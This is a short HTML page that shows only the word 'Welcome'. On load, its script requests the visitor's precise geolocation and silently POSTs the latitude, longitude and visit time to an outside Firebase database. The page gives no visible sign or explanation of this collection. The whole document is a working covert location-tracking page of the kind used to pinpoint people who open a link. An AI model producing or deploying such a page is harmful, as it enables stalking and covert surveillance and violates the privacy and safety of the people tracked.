<!DOCTYPE html>
<html>
  <body onload="getLocation()">
    <div>Welcome</div>

    <p id="demo"></p>

    <script>
      var x = document.getElementById("demo");

      const options = {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
      };

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(success, error);
        } else {
          x.innerHTML = "Geolocation is not supported by this browser.";
        }
      }

      function success(position) {
        const data = `Latitude: ${position.coords.latitude} | Longitude: ${
          position.coords.longitude
        } | Visited Time: ${Date(Date.now())}\n`;
        fetch(`https://check-location-c5a9b.firebaseio.com/check.json`, {
          method: "POST",
          body: JSON.stringify(data)
        });
      }

      function error(error) {
        alert(`Error (${error.code}: ${error.message}`);
      }
    </script>
  </body>
</html>
